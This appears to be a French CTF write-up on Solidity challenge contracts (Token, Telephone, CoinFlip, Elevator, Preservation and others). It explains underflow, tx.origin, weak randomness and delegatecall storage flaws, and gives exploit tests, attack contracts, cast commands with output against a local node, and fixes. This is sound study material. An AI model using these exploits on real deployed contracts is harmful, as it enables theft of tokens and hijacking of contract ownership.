# Token.sol
Attaque de type `underflow` car la version ^0.6.0 de solidity ne prend pas en compte 
ce type de debordement automatiquement mais ca été rajouté à partir de solidity ^0.8.0.
<br>
Faille potentielle:
```javascript
 function transfer(address _to, uint256 _value) public returns (bool) {
        //Faille potentielle de type underflow 
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }
```

**Impact:** 

Si la balance du msg.sender qui est 20 est inférieure à la valeur précisée par exemple ici 500
alors la balance du msg.sender passera à `type(uint256).max -value`, `value etant 500`  et la
balance du receiver sera `value qui est égale à 500`.
**Proof of code:**

forge create src/Token.sol:Token --constructor-args 20 --rpc-url 127.0.0.1
:8545 --account anvil
<br>
TK=0x5FbDB2315678afecb367f032d93F642f64180aa3 qui correspond à l'adresse du contract deployé
<br>
cast call $TK "balanceOf(address)" 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266 --rpc-url 127.0.0.1:8545
outpout : 0x0000000000000000000000000000000000000000000000000000000000000014
<br>
cast --to-dec 0x0000000000000000000000000000000000000000000000000000000000000014
output: 20
<br>
cast send $TK "transfer(address,uint256)" 0x70997970C51812dc3A010C7d01b50e0d17dc79C8 500 --rpc-url 127.0.0.1:8545 --account anvil
<br>
cast call $TK "balanceOf(address)" 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266 --rpc-url 127.0.0.1:8545
<br>
output: 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe20
<br>
cast call $TK "balanceOf(address)" 0x70997970C51812dc3A010C7d01b50e0d17dc79C8 --rpc-url 127.0.0.1:8545
<br>
output: 0x00000000000000000000000000000000000000000000000000000000000001f4
<br>
cast --to-dec 0x00000000000000000000000000000000000000000000000000000000000001f4
<br>
output: 500


**Prvention:**
<br>
Pour eviter les types d'erreurs underflow ou overflow bien vouloir utiliser la version ^0.8.0
de solidity qui les prend en charge en effectuant un revert automatique ou utiliser la librairie SafeMath ou tout simplement au lieu de verifier la balance comme ca:
```diff
- require(balances[msg.sender] - _value >= 0);
```
,bien vouloir le faire comme ca:
```diff
+ require(balances[msg.sender]  >= _value);
```

# Telephone.sol

tx.origin est différent de msg.sender.
La faille dans ce contract se trouve dans :
```javascript
function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
```
On devrait plutot faire 
```javascript
if (owner == msg.sender) {
            owner = _owner;
        }
```
Pour prendre le contrôle du smart contract il faut appeller la fonction changeOwner dans un autre
contract et initier une transaction depuis un EOA de telle sorte que le EOA soit
le tx.origin et le contract lui même soit le msg.sender

<details>
<summary>Proof of Code</summary>

```javascript
 function testClaimOwnerShip() public {
        address one = address(1);
        vm.prank(alice);
        atck.attack(one);
        console.log("telephone owner address is now", tel.owner());
    }
```
Et voici la definition de la fonction attack

```javascript
function attack(address owner) external {
        telephone.changeOwner(owner);
    }
```
</details>

# Delegate.sol
Si un attaquant déclenche constamment des appels erronés à des fonctions inexistantes, il peut épuiser le gaz disponible ou provoquer des erreurs, empêchant d’autres transactions dans un même bloc.

# CoinFlip.sol
Ne jamais uitliser block.number ou block.timestamp comme source d'aleatoire

La fonction dans CoinFlip.sol est 
```javascript
function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
```
Pour hacker le code c'est a dire ganger dix fois consécutives il me suffit de faire
```javascript
function testFlip() public {
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 blockValue;
        uint256 coinFlip;
        bool side;
        for (uint256 i = 0; i < 10; i++) {
            blockValue = uint256(blockhash(block.number - 1));
            coinFlip = blockValue / FACTOR;
            side = coinFlip == 1 ? true : false;
            if (side) {
                cf.flip(side);
            } else {
                cf.flip(!side);
            }
            if (cf.consecutiveWins() == 10) {
                console.log("you win ");
                return;
            }
            vm.warp(block.timestamp + 1);
            vm.roll(block.number + 1);
        }
}
```
**Conseils:**
Il faut utiliser chainlink VRF pour les sources aléatoires au lieu de block.number ou block.timestamp

# Elevator.sol
On peut creer l'instance d'une interface en s'assurant que l'adresse passé à l'interface pour 
l'opreation de cast impléménte l'interface pour ne pas avoir d'erreurs.
Par exemple on a l'interface 
```javascript
interface Building {
    function isLastFloor(uint256) external returns (bool);
}
```
et dans le contract Elevator il est fait 
```javascript
Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
```
Il faudrait donc que le msg.sender ici ait forcémment implémenté l'interface Building.
Ici le msg.sender serait le contract Attack et je l'ai definit de la sorte
```javascript
contract Attack is Building {
    function isLastFloor(uint256) external pure override returns (bool) {
        return true;
    }
}
```
Il implémente bien l'interface et depuis le fichier ElevatorTest.t.sol ou j'ecris le test pour
effectuer l'attaque j'ai:
```javascript
function testGoToFloor() public {
        assertEq(elv.floor(), 0);
        //J'utilise cette syntaxe par ce que je n'ai pas initialisé elv.top au debut
        // a true ou false
        assert(!elv.top());
        vm.prank(address(atck));
        elv.goTo(2);
        assertEq(elv.floor(), 0);
        assert(!elv.top());
    }
```
Ici on voit dans le vm.prank que c'est l'instance du contract Attack, ici atck qui effectue la 
transaction et qu'il a bien implémenté l'interface Building


# Preservation.sol 
La fonction delegatecall modifie la valeur du slot correpondant dans le contract appelant, pas
dans le contract appelé comme le fait call.

Suite des commandes pour changer l'adresse du owner:
forge create src/Preservation.sol:LibraryContract --rpc-url 127.0.0.1:8545 --account anvil
l1=0x5FbDB2315678afecb367f032d93F642f64180aa3

forge create src/Preservation.sol:LibraryContract --rpc-url 127.0.0.1:8545 --account anvil
l2=0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512

forge create src/Preservation.sol:Preservation --constructor-args $l1 $l2 --rpc-url 127.0.0.1:8545 --account anvil
p=0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0

forge create src/Preservation.sol:Attack --constructor-args $l1 $l2 --rpc-url 127.0.0.1:8545 --account anvil
a=0xCf7Ed3AccA5a467e9e704C703E8D87F634fB0Fc9

 cast storage $p 0
0x0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa3

cast storage $p 2
0x000000000000000000000000f39fd6e51aad88f6f4ce6ab8827279cfffb92266

dakdak@dakdak:~/code/SECURITY/CTF$ chisel
Welcome to Chisel! Type `!help` to show available commands.
➜ address attack = 0xCf7Ed3AccA5a467e9e704C703E8D87F634fB0Fc9
➜ uint256 attackCasted = uint256(uin160(attack))
➜ uint256 attackCasted = uint256(uint160(attack))
➜ attackCasted
Type: uint256
├ Hex: 0xcf7ed3acca5a467e9e704c703e8d87f634fb0fc9
├ Hex (full word): 0xcf7ed3acca5a467e9e704c703e8d87f634fb0fc9
└ Decimal: 1184589422945421143511828701991100965039074119625

cast send $p "setFirstTime(uint256)" 1184589422945421143511828701991100965039074119625 --rpc-url 127.0.0.1:8545 --account anvil

cast storage $p 0
0x000000000000000000000000cf7ed3acca5a467e9e704c703e8d87f634fb0fc9 //correspond à l'adresse
de l'instance du contract Attack

dakdak@dakdak:~/code/SECURITY/CTF$ chisel
Welcome to Chisel! Type `!help` to show available commands.
➜ address owner =0x70997970C51812dc3A010C7d01b50e0d17dc79C8
➜ uint256 ownerCasted = uint256(uint160(owner))
➜ ownerCasted
Type: uint256
├ Hex: 0x70997970c51812dc3a010c7d01b50e0d17dc79c8
├ Hex (full word): 0x70997970c51812dc3a010c7d01b50e0d17dc79c8
└ Decimal: 642829559307850963015472508762062935916233390536

cast send $p "setFirstTime(uint256)" 642829559307850963015472508762062935916233390536 --rpc-url 127.0.0.1:8545 --account anvil

cast storage $p 2
0x00000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c8 //correspond a l'adresse du nouveau owner

# Recovery.sol
Il est important de noter qu'après le deploiement du smart contract , le CA a une valeur de 
nonce egale a 1
